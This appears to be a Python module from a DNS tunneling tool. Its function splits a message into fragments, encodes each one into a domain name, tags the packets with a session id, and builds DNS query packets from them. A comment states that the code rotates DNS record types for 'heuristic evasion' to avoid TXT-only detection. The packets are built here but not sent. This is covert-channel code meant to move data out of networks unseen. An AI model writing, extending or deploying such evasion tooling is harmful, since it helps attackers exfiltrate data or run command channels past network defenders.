import random
from dnslib import DNSRecord, QTYPE, DNSHeader, DNSQuestion
from message_fragmentation import fragment_message
import cvc_codec 

# QTYPE rotation for heuristic evasion
# Mix of common record types to avoid "TXT-only" detection
QTYPE_ROTATION = [QTYPE.A, QTYPE.AAAA, QTYPE.CNAME, QTYPE.TXT, QTYPE.MX]

def dns_message(message, chunk_size):
    try:
        # Convert to bytes if needed
        if isinstance(message, str):
            message_bytes = message.encode('utf-8')
        else:
            message_bytes = message

        # 1. Fragment message - returns (session_id, chunks)
        session_id, binary_chunks = fragment_message(message_bytes, chunk_size)
        
        print(f"[BUILD DEBUG] fragment_message returned {len(binary_chunks)} chunks, session={session_id}")
        
        records = []
        
        for idx, b_chunk in enumerate(binary_chunks):
            # 2. CVC encode the chunk to domain name
            domain_name = cvc_codec.encode_packet_to_domain(b_chunk)
            
            # 3. Build DNS packet with session_id as Transaction ID
            header = DNSHeader(id=session_id, qr=0, rd=1)
            
            # 4. QTYPE ROTATION - randomly select record type per packet
            qtype = random.choice(QTYPE_ROTATION)
            q = DNSQuestion(domain_name, qtype)
            
            dns_packet = DNSRecord(header=header, q=q).pack()
            records.append(dns_packet)
        
        print(f"[BUILD DEBUG] dns_message returning {len(records)} DNS packets")
        return records

    except Exception as e:
        print(f"Error in dns_message: {e}")
        return []